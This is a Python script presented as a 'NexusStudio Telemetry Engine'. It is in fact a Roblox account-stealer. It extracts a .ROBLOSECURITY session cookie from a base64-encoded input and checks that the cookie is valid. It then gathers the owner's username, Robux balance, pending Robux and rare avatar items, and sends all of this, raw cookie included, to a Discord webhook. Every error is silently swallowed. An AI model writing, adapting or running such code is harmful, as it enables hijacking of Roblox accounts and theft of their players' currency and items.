import sys
import base64
import os
import requests
import re

def main():
    try:
        if len(sys.argv) < 2:
            return
        
        try:
            decoded_script = base64.b64decode(sys.argv[1]).decode('utf-8', errors='ignore')
        except Exception:
            return

        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            return

        match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script, re.DOTALL)
        if not match:
            return

        roblosecurity = match.group(1)
        roblosecurity = re.sub(r'\s+', '', roblosecurity)
        roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')

        headers = { 
            "Cookie": f".ROBLOSECURITY={roblosecurity}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        user_res = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
        
        username = "Unknown User"
        user_id = 0
        cookie_status = "🔴 Invalid / Expired"
        robux_balance = 0
        pending_robux = 0
        has_korblox = False
        has_headless = False
        color_code = 15548997

        if user_res.status_code == 200:
            user_data = user_res.json()
            username = user_data.get("name", "Verified User")
            user_id = user_data.get("id", 0)
            cookie_status = "🟢 Valid & Active"
            color_code = 3092790

            # Fetch Robux Balance
            try:
                economy_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
                if economy_res.status_code == 200:
                    robux_balance = economy_res.json().get("robux", 0)
            except Exception:
                pass

            # Fetch Pending Robux
            try:
                trans_res = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Pending&limit=10", headers=headers)
                if trans_res.status_code == 200:
                    trans_data = trans_res.json().get("data", [])
                    for t in trans_data:
                        currency = t.get("currency", {})
                        if currency.get("amount"):
                            pending_robux += currency.get("amount")
            except Exception:
                pass

            # Check Avatar / Outfit assets endpoint to detect Korblox / Headless presence
            try:
                avatar_res = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/avatar", headers=headers)
                if avatar_res.status_code == 200:
                    avatar_data = avatar_res.json()
                    
                    # Check asset IDs, asset type names, or package IDs
                    assets = avatar_data.get("assets", [])
                    equipped_ids = [str(asset.get("id")) for asset in assets]
                    
                    # Korblox asset and package identifiers
                    korblox_identifiers = ["13961116", "13961118", "192", "13961120"]
                    headless_identifiers = ["134082579", "134082581", "201", "134082583"]

                    for aid in equipped_ids:
                        if any(k in aid for k in korblox_identifiers):
                            has_korblox = True
                        if any(h in aid for h in headless_identifiers):
                            has_headless = True

                    # Also check user outfits / wearable bundles
                    outfits_res = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/outfits?isEditable=true&limit=50", headers=headers)
                    if outfits_res.status_code == 200:
                        outfits = outfits_res.json().get("data", [])
                        for outfit in outfits:
                            outfit_id = outfit.get("id")
                            detail_res = requests.get(f"https://avatar.roblox.com/v1/outfits/{outfit_id}", headers=headers)
                            if detail_res.status_code == 200:
                                details = detail_res.json()
                                outfit_assets = [str(a.get("id")) for a in details.get("assets", [])]
                                if any(k in "".join(outfit_assets) for k in korblox_identifiers):
                                    has_korblox = True
                                if any(h in "".join(outfit_assets) for h in headless_identifiers):
                                    has_headless = True
            except Exception:
                pass

        payload = {
            "username": f"{username} | Telemetry",
            "avatar_url": f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png",
            "embeds": [{
                "author": {
                    "name": f"Discord Notification",
                    "icon_url": "https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f4bb.png"
                },
                "description": (
                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**\n\n"
                    f"👤 **Username**\n`{username}`\n\n"
                    f"🪙 **Robux**\n"
                    f"> Balance: `{robux_balance}` 🪙\n"
                    f"> Pending: `{pending_robux}` 🪙\n\n"
                    f"🎒 **Inventory Items**\n"
                    f"> Korblox: `{'🟢 | True' if has_korblox else '❌ | False'}`\n"
                    f"> Headless: `{'🟢 | True' if has_headless else '❌ | False'}`\n\n"
                    f"📊 **Status**: `{cookie_status}`\n\n"
                    f"🔑 **.ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                ),
                "color": color_code,
                "thumbnail": {
                    "url": f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
                },
                "footer": { "text": "NexusStudio Telemetry Engine • 2026" }
            }]
        }

        requests.post(webhook_url, json=payload)

    except Exception:
        pass

if __name__ == "__main__":
    main()
